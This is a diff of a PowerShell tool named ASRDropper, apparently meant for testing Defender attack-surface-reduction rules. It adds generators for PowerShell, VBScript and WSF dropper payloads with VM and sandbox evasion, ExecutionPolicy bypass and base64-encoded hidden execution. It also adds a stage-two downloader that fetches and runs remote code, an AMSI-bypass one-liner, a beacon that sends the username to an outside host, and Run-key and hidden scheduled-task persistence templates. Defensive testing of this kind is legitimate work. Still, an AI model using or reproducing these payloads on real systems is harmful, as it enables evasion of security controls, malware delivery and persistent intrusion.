@@ -1,35 +1,322 @@
+﻿# ─────────────────────────────────────────────────────
+#  Enhanced logging function
 # ─────────────────────────────────────────────────────
-#  Top‐level banner definition
-# ─────────────────────────────────────────────────────
-Clear-Host
+# Define DropPath explicitly before using any functions
+$DropPath = "C:\Users\Public"
 
-$banner = @'
-             .%*@-                           
-            -@::@:                               
-          .*%. =@.                               
-          .@:  #*%@@@@@@%=..                     
-          :@  .@+:...    ..:+%%@@@%+::....    .. 
-         .%+ .+#..-*#%@@#+-::.....  ..-*#%@*.... 
-         .=*#@@=...      ..:=+**%@%*+=-...%=.... 
-               ...            ...   ..-=+##...   
-                                                  
-                -%%%%%%%%%%%%%%%%%%%%%%%%%%=.    
-     *@%%%%%%%%%@+                     ..-%#.    
-      -@+.      #+                  .-@@+.       
-        :#@+:.  #+.             ..=@#:.       
-           .=*@@%#*=.         ..+%-.        
-               ....%=       ...%=.          
-                  .%=        .:@.                
-                 .@%. .%@@@@=. -@=               
-             ..-@%..=@=.    ..=@#:.            
-             .%%###%@. .....  *@####@:           
-             .%*===+@@%#****#@@%====@:           
-'@
+function Write-Log {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$Message,
+        
+        [Parameter(Mandatory=$false)]
+        [ValidateSet('INFO', 'WARNING', 'ERROR', 'SUCCESS', 'DEBUG')]
+        [string]$Level = 'INFO',
+        
+        [Parameter(Mandatory=$false)]
+        [string]$LogPath = "$DropPath\ASRDropper_log.txt",
+        
+        [Parameter(Mandatory=$false)]
+        [switch]$NoConsole
+    )
+    
+    # Create timestamp
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    
+    # Format log entry
+    $logEntry = "[$timestamp] [$Level] $Message"
+    
+    # Determine console color based on level
+    $consoleColor = switch ($Level) {
+        'INFO'    { 'White' }
+        'WARNING' { 'Yellow' }
+        'ERROR'   { 'Red' }
+        'SUCCESS' { 'Green' }
+        'DEBUG'   { 'Cyan' }
+        default   { 'White' }
+    }
+    
+    # Write to log file (create directory if it doesn't exist)
+    $logDir = Split-Path -Path $LogPath -Parent
+    if (-not (Test-Path -Path $logDir)) {
+        New-Item -ItemType Directory -Force -Path $logDir | Out-Null
+    }
+    
+    # Append to log file
+    Add-Content -Path $LogPath -Value $logEntry -Force
+    
+    # Write to console if not suppressed
+    if (-not $NoConsole) {
+        Write-Host $logEntry -ForegroundColor $consoleColor
+    }
+}
 
 # ─────────────────────────────────────────────────────
-#  Menu function with boxed header
+#  PowerShell payload generation function
 # ─────────────────────────────────────────────────────
+function New-PowerShellPayload {
+    param(
+        [string]$OutputPath,
+        [string]$PayloadToExecute,
+        [switch]$WithEvasion,
+        [switch]$WithDownloader
+    )
+    
+    Write-Log "Generating PowerShell payload..." -Level INFO
+    
+    # Start with basic template
+    $payloadContent = "@echo off`nsetlocal`npowershell.exe -NoProfile -ExecutionPolicy Bypass -Command `"&{`n"
+    
+    # Add evasion techniques if requested
+    if ($WithEvasion) {
+        Write-Log "Adding evasion techniques to PowerShell payload" -Level DEBUG
+        $payloadContent += @"
+# Check for sandbox/analysis environment
+`$isVM = (Get-WmiObject -Class Win32_ComputerSystem).Model -match 'Virtual|VMware|VirtualBox|HVM'
+`$isAnalysis = (Get-Process -Name wireshark, processexplorer, processhacker -ErrorAction SilentlyContinue).Count -gt 0
+if (`$isVM -or `$isAnalysis) {
+    Write-Output 'Environment check failed, exiting...'
+    exit
+}
+Start-Sleep -Seconds 3
 
+"@
+    }
+    
+    # Add downloader component if requested
+    if ($WithDownloader) {
+        Write-Log "Adding download capability to PowerShell payload" -Level DEBUG
+        $payloadContent += @"
+# Download component
+try {
+    Invoke-WebRequest -Uri 'http://127.0.0.1:8080/stage2.ps1' -OutFile '`$env:TEMP\stage2.ps1' -ErrorAction Stop
+    if (Test-Path '`$env:TEMP\stage2.ps1') {
+        . '`$env:TEMP\stage2.ps1'
+    }
+} catch {
+    Write-Output 'Download failed, continuing with embedded payload...'
+}
+
+"@
+    }
+    
+    # Add the actual payload
+    $payloadContent += "$PayloadToExecute`n`"}`""
+    
+    # Save to file
+    Set-Content -Path $OutputPath -Value $payloadContent -Force
+    Write-Log "PowerShell payload saved to: $OutputPath" -Level SUCCESS
+    
+    return $OutputPath
+}
+
+# ─────────────────────────────────────────────────────
+#  VBScript payload generation function
+# ─────────────────────────────────────────────────────
+function New-VBScriptPayload {
+    param(
+        [string]$OutputPath,
+        [string]$PayloadToExecute,
+        [switch]$WithEvasion,
+        [switch]$LaunchPowerShell
+    )
+    
+    Write-Log "Generating VBScript payload..." -Level INFO
+    
+    # Prepare PowerShell command to be executed
+    $poshCommand = $PayloadToExecute
+    if ($LaunchPowerShell) {
+        # Encode the PowerShell command
+        $bytes = [System.Text.Encoding]::Unicode.GetBytes($PayloadToExecute)
+        $encodedCommand = [Convert]::ToBase64String($bytes)
+        $poshCommand = "-EncodedCommand $encodedCommand"
+    }
+    
+    # Start with basic template
+    $payloadContent = "Option Explicit`r`n"
+    
+    # Add evasion techniques if requested
+    if ($WithEvasion) {
+        Write-Log "Adding evasion techniques to VBScript payload" -Level DEBUG
+        $payloadContent += @"
+' Sandbox evasion techniques
+Function IsVirtualMachine()
+    Dim objWMI, colItems
+    On Error Resume Next
+    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
+    Set colItems = objWMI.ExecQuery("Select * from Win32_ComputerSystem")
+    For Each objItem in colItems
+        If InStr(LCase(objItem.Model), "virtual") > 0 Then
+            IsVirtualMachine = True
+            Exit Function
+        End If
+    Next
+    IsVirtualMachine = False
+End Function
+
+' Sleep to evade sandbox
+WScript.Sleep 5000
+
+' Check for VM
+If IsVirtualMachine() Then
+    WScript.Echo "Environment check failed, exiting..."
+    WScript.Quit
+End If
+
+"@
+    }
+    
+    # Add the execution component
+    if ($LaunchPowerShell) {
+        $payloadContent += @"
+' Execute PowerShell command
+Dim objShell, powershellCmd
+Set objShell = CreateObject("WScript.Shell")
+powershellCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass $poshCommand"
+objShell.Run powershellCmd, 0, False
+"@
+    } else {
+        $payloadContent += @"
+' Execute direct VBScript code
+Dim objShell
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "cmd.exe /c $poshCommand", 0, False
+"@
+    }
+    
+    # Save to file
+    Set-Content -Path $OutputPath -Value $payloadContent -Force
+    Write-Log "VBScript payload saved to: $OutputPath" -Level SUCCESS
+    
+    return $OutputPath
+}
+
+# ─────────────────────────────────────────────────────
+#  WSF (Windows Script File) payload generation function
+# ─────────────────────────────────────────────────────
+function New-WSFPayload {
+    param(
+        [string]$OutputPath,
+        [string]$PayloadToExecute,
+        [switch]$WithEvasion
+    )
+    
+    Write-Log "Generating WSF payload..." -Level INFO
+    
+    # Start with basic template
+    $payloadContent = @"
+<?xml version="1.0" ?>
+<package>
+    <job id="VBSSection">
+        <script language="VBScript">
+            Option Explicit
+            
+"@
+    
+    # Add evasion techniques if requested
+    if ($WithEvasion) {
+        Write-Log "Adding evasion techniques to WSF payload" -Level DEBUG
+        $payloadContent += @"
+            ' Sandbox evasion techniques
+            Function IsVirtualMachine()
+                Dim objWMI, colItems
+                On Error Resume Next
+                Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
+                Set colItems = objWMI.ExecQuery("Select * from Win32_ComputerSystem")
+                For Each objItem in colItems
+                    If InStr(LCase(objItem.Model), "virtual") > 0 Then
+                        IsVirtualMachine = True
+                        Exit Function
+                    End If
+                Next
+                IsVirtualMachine = False
+            End Function
+            
+            ' Sleep to evade sandbox
+            WScript.Sleep 5000
+            
+            ' Check for VM
+            If IsVirtualMachine() Then
+                WScript.Echo "Environment check failed, exiting..."
+                WScript.Quit
+            End If
+            
+"@
+    }
+    
+    # Add VBScript execution section
+    $payloadContent += @"
+            ' VBScript section
+            Dim objShell
+            Set objShell = CreateObject("WScript.Shell")
+            objShell.Run "cmd.exe /c echo VBScript section executed", 0, True
+        </script>
+    </job>
+    
+    <job id="JSSection">
+        <script language="JScript">
+            // JScript section
+"@
+    
+    if ($WithEvasion) {
+        $payloadContent += @"
+            
+            // Sleep for evasion
+            function sleep(milliseconds) {
+                var start = new Date().getTime();
+                for (var i = 0; i < 1e7; i++) {
+                    if ((new Date().getTime() - start) > milliseconds) {
+                        break;
+                    }
+                }
+            }
+            
+            sleep(3000);
+            
+"@
+    }
+    
+    # Add the actual PowerShell execution 
+    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($PayloadToExecute))
+    
+    $payloadContent += @"
+            
+            // Execute PowerShell command
+            var shell = new ActiveXObject("WScript.Shell");
+            var cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand";
+            shell.Run(cmd, 0, false);
+        </script>
+    </job>
+</package>
+"@
+    
+    # Save to file
+    Set-Content -Path $OutputPath -Value $payloadContent -Force
+    Write-Log "WSF payload saved to: $OutputPath" -Level SUCCESS
+    
+    return $OutputPath
+}
+
+# ─────────────────────────────────────────────────────
+#  Update Global variables section
+# ─────────────────────────────────────────────────────
+$Execute         = $false
+$LogHtml         = $true
+$Persist         = $false
+$CreateShortcut  = $false
+$Cleanup         = $false
+$Signatures      = $false
+$Evasion         = $false
+$ExternalProcess = "calc.exe"
+$PayloadCode     = "Write-Output '[Stage 2] Payload Executed!'"
+$TestASR         = $false
+$SelectedASRRules= @()
+$VerboseLogging  = $true       # New: Enable detailed logging
+$LogFile         = "ASRDropper_detailed.log" # New: Default log file
+
+# ─────────────────────────────────────────────────────
+#  Update Show-Menu function to include new options
+# ─────────────────────────────────────────────────────
 function Show-Menu {
     Clear-Host
     $border = '*' * 60
@@ -38,7 +325,7 @@ function Show-Menu {
     Write-Host $border -ForegroundColor DarkCyan
 
     $titleText   = 'ASRDROPPER'
-    $versionText = 'v1.0 - Use with Caution'
+    $versionText = 'v1.1 - Enhanced Testing Suite'  # Updated version
     $contentWidth = $border.Length - 2
     $titleLine   = '*' + $titleText.PadLeft(([math]::Floor(($contentWidth + $titleText.Length)/2))).PadRight($contentWidth) + '*'
     $versionLine = '*' + $versionText.PadLeft(([math]::Floor(($contentWidth + $versionText.Length)/2))).PadRight($contentWidth) + '*'
@@ -60,345 +347,186 @@ function Show-Menu {
     Write-Host "[9] Choose Process for HTA/COM Launch ($ExternalProcess)"
     Write-Host "[A] Configure ASR Rules Testing" -ForegroundColor Yellow
     Write-Host "[C] Toggle: Upload Logs to Azure Blob ($UploadLogs)"
+    Write-Host "[L] Configure Detailed Logging Options" -ForegroundColor Green  # New option
+    Write-Host "[P] Configure Additional Payload Types" -ForegroundColor Green  # New option
     Write-Host "[Y] Generate YARA Signature Baits"
     Write-Host "[Z] Generate All Payload Variants"
     Write-Host "[0] Run Dropper with Selected Options"
     Write-Host
-    #Write-Host "Choose an option:" -NoNewline
 }
 
-
 # ─────────────────────────────────────────────────────
-#  Global defaults
+#  Add new logging configuration menu
 # ─────────────────────────────────────────────────────
-$Execute         = $false
-$LogHtml         = $true
-$Persist         = $false
-$CreateShortcut  = $false
-$Cleanup         = $false
-$Signatures      = $false
-$Evasion         = $false
-$ExternalProcess = "calc.exe"
-$PayloadCode     = "Write-Output '[Stage 2] Payload Executed!'"
-$TestASR         = $false
-$SelectedASRRules= @()
-
-# ─────────────────────────────────────────────────────
-#  Kick it off
-# ─────────────────────────────────────────────────────
-Show-Menu
-
-# Define ASR Rules with their IDs (GUIDs) and descriptions
-$ASRRules = @(
-    @{
-        Name = "Block executable content from email client and webmail";
-        Id = "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550";
-        Description = "Blocks executable files launched from email or webmail clients";
-        Category = "Mail";
-        Standard = $false;
-    },
-    @{
-        Name = "Block all Office applications from creating child processes";
-        Id = "D4F940AB-401B-4EFC-AADC-AD5F3C50688A";
-        Description = "Prevents Office apps from creating child processes, a common malware technique";
-        Category = "Office";
-        Standard = $false;
-    },
-    @{
-        Name = "Block Office applications from creating executable content";
-        Id = "3B576869-A4EC-4529-8536-B80A7769E899";
-        Description = "Blocks Office apps from creating executable files, commonly used in macro attacks";
-        Category = "Office";
-        Standard = $false;
-    },
-    @{
-        Name = "Block Office applications from injecting code into other processes";
-        Id = "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84";
-        Description = "Prevents Office apps from injecting code into other processes";
-        Category = "Office";
-        Standard = $false;
-    },
-    @{
-        Name = "Block JavaScript or VBScript from launching downloaded executable content";
-        Id = "D3E037E1-3EB8-44C8-A917-57927947596D";
-        Description = "Prevents scripts from launching downloaded executable content";
-        Category = "Scripts";
-        Standard = $false;
-    },
-    @{
-        Name = "Block execution of potentially obfuscated scripts";
-        Id = "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC";
-        Description = "Blocks scripts that appear to be obfuscated";
-        Category = "Scripts";
-        Standard = $false;
-    },
-    @{
-        Name = "Block Win32 API calls from Office macros";
-        Id = "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B";
-        Description = "Blocks Office macros from making Win32 API calls";
-        Category = "Office";
-        Standard = $false;
-    },
-    @{
-        Name = "Block executable files from running unless they meet prevalence, age, or trusted list criteria";
-        Id = "01443614-CD74-433A-B99E-2ECDC07BFC25";
-        Description = "Uses cloud protection to block suspicious executables";
-        Category = "Executables";
-        Standard = $false;
-    },
-    @{
-        Name = "Block credential stealing from the Windows local security authority subsystem";
-        Id = "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2";
-        Description = "Blocks credential theft from LSASS";
-        Category = "Credential Theft";
-        Standard = $true;
-    },
-    @{
-        Name = "Block process creations originating from PSExec and WMI commands";
-        Id = "D1E49AAC-8F56-4280-B9BA-993A6D77406C";
-        Description = "Blocks processes created by PSExec and WMI commands";
-        Category = "Lateral Movement";
-        Standard = $false;
-    },
-    @{
-        Name = "Block untrusted and unsigned processes that run from USB";
-        Id = "B2B3F03D-6A65-4F7B-A9C7-1C7EF74A9BA4";
-        Description = "Blocks untrusted/unsigned USB executables";
-        Category = "USB";
-        Standard = $false;
-    },
-    @{
-        Name = "Block Office communication applications from creating child processes";
-        Id = "26190899-1602-49E8-8B27-EB1D0A1CE869";
-        Description = "Blocks Office communication apps (Outlook, Teams) from creating child processes";
-        Category = "Office";
-        Standard = $false;
-    },
-    @{
-        Name = "Block Adobe Reader from creating child processes";
-        Id = "7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C";
-        Description = "Blocks Adobe Reader from creating child processes";
-        Category = "Adobe";
-        Standard = $false;
-    },
-    @{
-        Name = "Block persistence through WMI event subscription";
-        Id = "E6DB77E5-3DF2-4CF1-B95A-636979351E5B";
-        Description = "Prevents WMI persistence techniques";
-        Category = "Persistence";
-        Standard = $true;
-    },
-    @{
-        Name = "Block abuse of exploited vulnerable signed drivers";
-        Id = "56A863A9-875E-4185-98A7-B882C64B5CE5";
-        Description = "Prevents abuse of vulnerable signed drivers";
-        Category = "Drivers";
-        Standard = $true;
-    },
-    @{
-        Name = "Use advanced protection against ransomware";
-        Id = "C1DB55AB-C21A-4637-BB3F-A12568109D35";
-        Description = "Provides enhanced protection against ransomware attacks";
-        Category = "Ransomware";
-        Standard = $false;
-    }
-)
-
-# Function to show ASR rules selection menu
-function Show-ASRRulesMenu {
+function Configure-Logging {
     Clear-Host
-    Write-Host "=== ASR Rules Testing Configuration ===" -ForegroundColor Yellow
-    Write-Host "Select which ASR rules to test:"
-    
-    # Create a new array with display indices
-    $displayRules = @()
-    
-    # Add standard rules first
-    $standardRules = $ASRRules | Where-Object { $_.Standard -eq $true }
-    foreach ($rule in $standardRules) {
-        $displayRules += $rule
-    }
-    
-    # Add other rules
-    $otherRules = $ASRRules | Where-Object { $_.Standard -eq $false }
-    foreach ($rule in $otherRules) {
-        $displayRules += $rule
-    }
-    
-    # Display standard protection rules first
-    Write-Host "Standard Protection Rules:" -ForegroundColor Green
-    
-    for ($i = 0; $i -lt $standardRules.Count; $i++) {
-        $rule = $standardRules[$i]
-        $index = $i + 1
-        $selected = $SelectedASRRules -contains $rule.Id
-        $indicator = if ($selected) { "[X]" } else { "[ ]" }
-        Write-Host "[$index] $indicator $($rule.Name)"
-        Write-Host "    GUID: $($rule.Id)" -ForegroundColor DarkGray
-        Write-Host "    $($rule.Description)" -ForegroundColor DarkGray
-    }
-    
-    Write-Host "`nOther Protection Rules:" -ForegroundColor Cyan
-    
-    # Display other rules
-    for ($i = 0; $i -lt $otherRules.Count; $i++) {
-        $rule = $otherRules[$i]
-        $index = $i + $standardRules.Count + 1
-        $selected = $SelectedASRRules -contains $rule.Id
-        $indicator = if ($selected) { "[X]" } else { "[ ]" }
-        Write-Host "[$index] $indicator $($rule.Name)"
-        Write-Host "    GUID: $($rule.Id)" -ForegroundColor DarkGray
-        Write-Host "    $($rule.Description)" -ForegroundColor DarkGray
-    }
-    
-    Write-Host "`n[A] Select All Rules"
-    Write-Host "[C] Clear All Selections"
-    Write-Host "[S] Select Standard Protection Rules Only"
-    Write-Host "[F] Filter by Category"
-    Write-Host "[T] Toggle Test ASR Rules ($TestASR)"
+    Write-Host "=== Detailed Logging Configuration ===" -ForegroundColor Green
+    Write-Host "Configure how detailed logs are generated:"
+    Write-Host "[1] Toggle: Verbose Logging ($VerboseLogging)"
+    Write-Host "[2] Change Log File Path (Current: $LogFile)"
+    Write-Host "[3] Toggle: Log to Event Log"
+    Write-Host "[4] Set Log Retention (Days)"
+    Write-Host "[5] Create Log Directory Structure"
     Write-Host "[B] Back to Main Menu"
     
     $choice = Read-Host "Enter your choice"
-    if ($choice -eq "B") {
-        # Simply return to main menu without clearing selections
-        return
-    }
-    elseif ($choice -eq "A") {
-        $script:SelectedASRRules = $ASRRules | ForEach-Object { $_.Id }
-    }
-    elseif ($choice -eq "C") {
-        $script:SelectedASRRules = @()
-    }
-    elseif ($choice -eq "S") {
-        $script:SelectedASRRules = $ASRRules | Where-Object { $_.Standard -eq $true } | ForEach-Object { $_.Id }
-    }
-    elseif ($choice -eq "T") {
-        $script:TestASR = -not $TestASR
-    }
-    elseif ($choice -eq "F") {
-        Filter-ASRRulesByCategory
-    }
-    elseif ([int]::TryParse($choice, [ref]$null)) {
-        $choiceNum = [int]$choice
-        if ($choiceNum -ge 1 -and $choiceNum -le $displayRules.Count) {
-            $selectedRule = $displayRules[$choiceNum - 1]
-            $ruleId = $selectedRule.Id
-            
-            if ($script:SelectedASRRules -contains $ruleId) {
-                $script:SelectedASRRules = $script:SelectedASRRules | Where-Object { $_ -ne $ruleId }
-            }
-            else {
-                $script:SelectedASRRules += $ruleId
+    switch ($choice) {
+        '1' { $script:VerboseLogging = -not $VerboseLogging }
+        '2' {
+            $newPath = Read-Host "Enter new log file path (full path or filename)"
+            if ($newPath -match '[\\/]') {
+                # Full path specified
+                $script:LogFile = $newPath
+            } else {
+                # Just filename
+                $script:LogFile = $newPath
             }
         }
-        else {
-            Write-Host "Invalid selection. Please enter a number between 1 and $($displayRules.Count)." -ForegroundColor Red
+        '3' {
+            Write-Host "Event log functionality not implemented yet" -ForegroundColor Yellow
+            Start-Sleep -Seconds 2
+        }
+        '4' {
+            $days = Read-Host "Enter log retention period in days"
+            if ([int]::TryParse($days, [ref]$null)) {
+                Write-Host "Log retention set to $days days" -ForegroundColor Green
+                # Implementation would be here
+            } else {
+                Write-Host "Invalid input. Please enter a number." -ForegroundColor Red
+            }
+            Start-Sleep -Seconds 2
+        }
+        '5' {
+            $logDir = Join-Path $DropPath "Logs"
+            if (-not (Test-Path $logDir)) {
+                New-Item -ItemType Directory -Path $logDir -Force | Out-Null
+                Write-Host "Created log directory: $logDir" -ForegroundColor Green
+            } else {
+                Write-Host "Log directory already exists: $logDir" -ForegroundColor Yellow
+            }
+            
+            # Create subdirectories
+            $dirs = @("ASR", "Payloads", "Persistence", "Reports")
+            foreach ($dir in $dirs) {
+                $path = Join-Path $logDir $dir
+                if (-not (Test-Path $path)) {
+                    New-Item -ItemType Directory -Path $path -Force | Out-Null
+                    Write-Host "Created directory: $path" -ForegroundColor Green
+                }
+            }
+            
+            $script:LogFile = Join-Path $logDir "ASRDropper_detailed.log"
+            Write-Host "Log file set to: $LogFile" -ForegroundColor Green
+            Start-Sleep -Seconds 3
+        }
+        'B' { return }
+        'b' { return }
+        default {
+            Write-Host "Invalid choice. Please try again." -ForegroundColor Red
             Start-Sleep -Seconds 2
         }
     }
     
-    Show-ASRRulesMenu
+    Configure-Logging
 }
 
-# Function to filter ASR rules by category
-function Filter-ASRRulesByCategory {
-    $categories = $ASRRules | ForEach-Object { $_.Category } | Sort-Object -Unique
-    
+# ─────────────────────────────────────────────────────
+#  Add additional payload types configuration menu
+# ─────────────────────────────────────────────────────
+$UsePS1Payload = $true
+$UseVBSPayload = $false
+$UseWSFPayload = $false
+$UseAllPayloads = $false
+
+function Configure-PayloadTypes {
     Clear-Host
-    Write-Host "=== Filter ASR Rules by Category ===" -ForegroundColor Yellow
-    Write-Host "Select a category to view/select rules:"
-    
-    $idx = 1
-    foreach ($category in $categories) {
-        Write-Host "[$idx] $category"
-        $idx++
-    }
-    
-    Write-Host "[B] Back to ASR Rules Menu"
+    Write-Host "=== Additional Payload Types Configuration ===" -ForegroundColor Green
+    Write-Host "Select which payload types to generate:"
+    Write-Host "[1] Toggle: PowerShell Script (.ps1) ($UsePS1Payload)"
+    Write-Host "[2] Toggle: VBScript (.vbs) ($UseVBSPayload)"
+    Write-Host "[3] Toggle: Windows Script File (.wsf) ($UseWSFPayload)"
+    Write-Host "[4] Toggle: Generate All Payload Types ($UseAllPayloads)"
+    Write-Host "[5] Configure Payload-specific Options"
+    Write-Host "[B] Back to Main Menu"
     
     $choice = Read-Host "Enter your choice"
-    if ($choice -eq "B") {
-        Show-ASRRulesMenu
-        return
-    }
-    elseif ([int]::TryParse($choice, [ref]$null)) {
-        $choiceNum = [int]$choice
-        if ($choiceNum -ge 1 -and $choiceNum -le $categories.Count) {
-            $selectedCategory = $categories[$choiceNum - 1]
-            Show-CategoryRules $selectedCategory
+    switch ($choice) {
+        '1' { $script:UsePS1Payload = -not $UsePS1Payload }
+        '2' { $script:UseVBSPayload = -not $UseVBSPayload }
+        '3' { $script:UseWSFPayload = -not $UseWSFPayload }
+        '4' { 
+            $script:UseAllPayloads = -not $UseAllPayloads
+            if ($UseAllPayloads) {
+                $script:UsePS1Payload = $true
+                $script:UseVBSPayload = $true
+                $script:UseWSFPayload = $true
+            }
         }
-        else {
-            Write-Host "Invalid selection. Please enter a number between 1 and $($categories.Count)." -ForegroundColor Red
+        '5' {
+            Configure-PayloadOptions
+        }
+        'B' { return }
+        'b' { return }
+        default {
+            Write-Host "Invalid choice. Please try again." -ForegroundColor Red
             Start-Sleep -Seconds 2
         }
     }
     
-    Filter-ASRRulesByCategory
+    Configure-PayloadTypes
 }
 
-# Function to show and select rules in a specific category
-function Show-CategoryRules {
-    param($Category)
-    
+# Payload-specific options
+$PSPayloadOptions = @{
+    UseDownloader = $false
+    UseReflection = $false
+    UseAmsiBypass = $false
+}
+
+$VBSPayloadOptions = @{
+    LaunchPowerShell = $true
+    UseActiveXObjects = $true
+    UseRegsvr32 = $false
+}
+
+function Configure-PayloadOptions {
     Clear-Host
-    Write-Host "=== ASR Rules in Category: $Category ===" -ForegroundColor Yellow
+    Write-Host "=== Payload-specific Options ===" -ForegroundColor Green
+    Write-Host "Configure options for specific payload types:"
+    Write-Host "`nPowerShell Options:" -ForegroundColor Cyan
+    Write-Host "[1] Toggle: Include Downloader Component ($($PSPayloadOptions.UseDownloader))"
+    Write-Host "[2] Toggle: Use Reflection Techniques ($($PSPayloadOptions.UseReflection))"
+    Write-Host "[3] Toggle: Include AMSI Bypass ($($PSPayloadOptions.UseAmsiBypass))"
     
-    $categoryRules = $ASRRules | Where-Object { $_.Category -eq $Category }
+    Write-Host "`nVBScript Options:" -ForegroundColor Cyan
+    Write-Host "[4] Toggle: Launch PowerShell from VBS ($($VBSPayloadOptions.LaunchPowerShell))"
+    Write-Host "[5] Toggle: Use ActiveX Objects ($($VBSPayloadOptions.UseActiveXObjects))"
+    Write-Host "[6] Toggle: Use regsvr32 Technique ($($VBSPayloadOptions.UseRegsvr32))"
     
-    # Display category rules with proper indexing
-    for ($i = 0; $i -lt $categoryRules.Count; $i++) {
-        $rule = $categoryRules[$i]
-        $index = $i + 1
-        $selected = $script:SelectedASRRules -contains $rule.Id
-        $indicator = if ($selected) { "[X]" } else { "[ ]" }
-        Write-Host "[$index] $indicator $($rule.Name)"
-        Write-Host "    GUID: $($rule.Id)" -ForegroundColor DarkGray
-        Write-Host "    $($rule.Description)" -ForegroundColor DarkGray
-    }
-    
-    Write-Host "`n[A] Select All in This Category"
-    Write-Host "[C] Clear All in This Category"
-    Write-Host "[B] Back to Category Filter"
+    Write-Host "`n[B] Back to Payload Types Menu"
     
     $choice = Read-Host "Enter your choice"
-    if ($choice -eq "B") {
-        Filter-ASRRulesByCategory
-        return
-    }
-    elseif ($choice -eq "A") {
-        foreach ($rule in $categoryRules) {
-            if ($script:SelectedASRRules -notcontains $rule.Id) {
-                $script:SelectedASRRules += $rule.Id
-            }
-        }
-    }
-    elseif ($choice -eq "C") {
-        foreach ($rule in $categoryRules) {
-            $script:SelectedASRRules = $script:SelectedASRRules | Where-Object { $_ -ne $rule.Id }
-        }
-    }
-    elseif ([int]::TryParse($choice, [ref]$null)) {
-        $choiceNum = [int]$choice
-        if ($choiceNum -ge 1 -and $choiceNum -le $categoryRules.Count) {
-            $selectedRule = $categoryRules[$choiceNum - 1]
-            $ruleId = $selectedRule.Id
-            
-            if ($script:SelectedASRRules -contains $ruleId) {
-                $script:SelectedASRRules = $script:SelectedASRRules | Where-Object { $_ -ne $ruleId }
-            }
-            else {
-                $script:SelectedASRRules += $ruleId
-            }
-        }
-        else {
-            Write-Host "Invalid selection. Please enter a number between 1 and $($categoryRules.Count)." -ForegroundColor Red
+    switch ($choice) {
+        '1' { $script:PSPayloadOptions.UseDownloader = -not $PSPayloadOptions.UseDownloader }
+        '2' { $script:PSPayloadOptions.UseReflection = -not $PSPayloadOptions.UseReflection }
+        '3' { $script:PSPayloadOptions.UseAmsiBypass = -not $PSPayloadOptions.UseAmsiBypass }
+        '4' { $script:VBSPayloadOptions.LaunchPowerShell = -not $VBSPayloadOptions.LaunchPowerShell }
+        '5' { $script:VBSPayloadOptions.UseActiveXObjects = -not $VBSPayloadOptions.UseActiveXObjects }
+        '6' { $script:VBSPayloadOptions.UseRegsvr32 = -not $VBSPayloadOptions.UseRegsvr32 }
+        'B' { return }
+        'b' { return }
+        default {
+            Write-Host "Invalid choice. Please try again." -ForegroundColor Red
             Start-Sleep -Seconds 2
         }
     }
     
-    Show-CategoryRules $Category
+    Configure-PayloadOptions
 }
 
+# ─────────────────────────────────────────────────────
+#  Update Select-Payload function with logging
+# ─────────────────────────────────────────────────────
 function Select-Payload {
     Write-Host "`n=== Payload Source Selection ===" -ForegroundColor Cyan
     Write-Host "[1] Use default payload"
@@ -408,7 +536,10 @@ function Select-Payload {
     $choice = Read-Host "Choose option"
 
     switch ($choice) {
-        '1' { return 'Write-Output "[Stage 2] Payload Executed!"' }
+        '1' { 
+            Write-Log "Selected default payload" -Level INFO
+            return 'Write-Output "[Stage 2] Payload Executed!"' 
+        }
         '2' {
             Write-Host "Paste your payload code (end with a blank line):"
             $lines = @()
@@ -417,13 +548,16 @@ function Select-Payload {
                 if ($line -eq '') { break }
                 $lines += $line
             }
+            Write-Log "Selected custom inline payload" -Level INFO
             return $lines -join "`n"
         }
         '3' {
             $file = Read-Host "Enter full path to .ps1 file"
             if (Test-Path $file) {
+                Write-Log "Loading payload from file: $file" -Level INFO
                 return Get-Content -Raw -Path $file
             } else {
+                Write-Log "File not found: $file" -Level ERROR
                 Write-Host "File not found." -ForegroundColor Red
                 return Select-Payload
             }
@@ -432,291 +566,52 @@ function Select-Payload {
             Write-Host "[a] AMSI Bypass"
             Write-Host "[b] Simulated LSASS Access"
             Write-Host "[c] Web Callback Beacon"
+            Write-Host "[d] Registry Persistence" # New template
+            Write-Host "[e] Scheduled Task Creation" # New template
             $tpl = Read-Host "Choose template"
             switch ($tpl) {
-                'a' { return '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)' }
-                'b' { return 'Get-Process -Name lsass | ForEach-Object { Write-Output "Accessing PID $($_.Id)" }' }
-                'c' { return 'Invoke-WebRequest -Uri http://example.com/beacon?id=$env:USERNAME' }
+                'a' { 
+                    Write-Log "Selected AMSI Bypass template" -Level INFO
+                    return '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)' 
+                }
+                'b' { 
+                    Write-Log "Selected LSASS Access template" -Level INFO
+                    return 'Get-Process -Name lsass | ForEach-Object { Write-Output "Accessing PID $($_.Id)" }' 
+                }
+                'c' { 
+                    Write-Log "Selected Web Callback template" -Level INFO
+                    return 'Invoke-WebRequest -Uri "http://example.com/beacon?id=$env:USERNAME" -UseBasicParsing' 
+                }
+                'd' {
+                    Write-Log "Selected Registry Persistence template" -Level INFO
+                    return 'New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TestPersistence" -Value "powershell.exe -WindowStyle Hidden -Command \"Write-Output ''Registry persistence test''\""'
+                }
+                'e' {
+                    Write-Log "Selected Scheduled Task template" -Level INFO
+                    return '$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command \"Write-Output ''Scheduled task test''\""
+$trigger = New-ScheduledTaskTrigger -Daily -At "12:00"
+$settings = New-ScheduledTaskSettingsSet -Hidden
+$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings
